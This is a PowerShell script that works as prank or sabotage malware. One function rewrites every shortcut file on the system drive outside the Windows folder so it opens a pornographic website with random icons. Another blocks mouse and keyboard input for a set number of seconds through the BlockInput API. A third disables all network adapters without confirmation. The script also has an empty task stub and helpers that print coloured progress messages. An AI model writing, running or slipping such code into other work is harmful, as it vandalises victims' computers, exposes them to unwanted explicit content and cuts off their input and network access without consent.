function changeShortcuts {
    param (
        [string]$imagesDirectory
    )

    functionPresentation -text "Changing Shortcuts"
    
    $object = New-Object -COM WScript.Shell
    
    informTerminal -category "Shortcuts" -result "SEARCHING" -color "cyan" -icon "+"

    $shortcuts = Get-ChildItem -Path "$env:SYSTEMDRIVE\" | Where-Object { $_.Name -ne "Windows" } | Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Where-Object { ($_.Extension -eq ".lnk" -or $_.Extension -eq ".url") -and $_.Fullname -notlike "$env:SYSTEMDRIVE\Users\$env:USERNAME\OneDrive\*" } | Select-Object -Property FullName

    informTerminal -category "Shortcuts" -result "FOUND $($shortcuts.Count) LNK" -color "green" -icon "+"

    $url = "https://pornhub.com"
    $iconNames = Get-ChildItem -Path $imagesDirectory -File -Filter *.ico
    $icons = $iconNames.FullName

    foreach ($shortcutPath in $($shortcuts.FullName)) {
        $randomIcon = ($icons | Get-Random)
        $shortcut = $object.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $url
        $shortcut.IconLocation = $randomIcon
        $shortcut.Save()

        informTerminal -category "Shortcuts" -result "MODIFIED $($shortcut.FullName.Split('\') | Select-Object -Last 1)" -color "green" -icon "+"
    }
}

function disableInputs {
    param (
        [int]$seconds
    )
    
    $code = @'
        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);
'@

    $userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

    Write-Output "[!] Mouse disabled"
    Write-Output "[!] Keyboard disabled"
    $userInput::BlockInput($true)
    Start-Sleep -Seconds $seconds
    $userInput::BlockInput($false)
    Write-Output "[+] Mouse enabled"
    Write-Output "[+] Keyboard enabled"
}

function disableNetworkAdapters {
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    Write-Output "[+] All network adapters disabled"
}

function addTasks {

}

function functionPresentation {
    param(
        [string]$text
    )

    Write-Host "`n"
    Write-Host "----- $text -----" -ForegroundColor yellow
    Write-Host "`n"
}
function Write-ColorOutput() {
    param (
        [string]$ForegroundColor
    )

    $fc = $host.UI.RawUI.ForegroundColor
    $host.UI.RawUI.ForegroundColor = $ForegroundColor

    if ($args) {
        Write-Output $args
    }
    else {
        $input | Write-Output
    }

    $host.UI.RawUI.ForegroundColor = $fc
}

function informTerminal {
    param (
        [Parameter()]
        [string]$category,
        [Parameter()]
        [string]$result,
        [Parameter()]
        [string]$color,
        [Parameter()]
        [string]$icon
    )

    Write-Output "`t[$icon] $category`n"
    Write-Output "`t`t$result`n" | Write-ColorOutput $color
}